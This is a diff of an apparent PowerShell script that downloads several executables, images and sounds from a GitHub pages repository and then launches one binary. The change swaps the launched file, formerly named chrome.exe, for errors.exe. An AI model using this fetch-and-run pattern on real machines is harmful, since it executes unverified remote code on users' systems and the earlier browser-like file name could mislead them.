@@ -41,7 +41,7 @@ $filesToDownload = @{
     "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/unbreak/app/a1.exe" = "$basePath\unbreak\app\a1.exe"
     "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/old/@break.exe" = "$basePath\old\@break.exe"
     "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/old/application.exe" = "$basePath\old\application.exe"
-    "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/old/chrome.exe" = "$basePath\old\chrome.exe"
+    "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/old/errors.exe" = "$basePath\old\errors.exe"
     "https://raw.githubusercontent.com/webntdev/webntdev.github.io/main/Windows/old/background/default.jpg" = "$basePath\old\background\default.jpg"
     "https://raw.githubusercontent.com/webntdev/webntdev.github.io/main/Windows/old/background/screenshot.png" = "$basePath\old\background\screenshot.png"
     "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/break/sounds/map.mp3" = "$basePath\break\sounds\map.mp3"
@@ -52,4 +52,4 @@ foreach ($url in $filesToDownload.Keys) {
     Invoke-WebRequest -Uri $url -OutFile $destinationPath
 }
 
-& "$basePath\old\chrome.exe"
+& "$basePath\old\errors.exe"
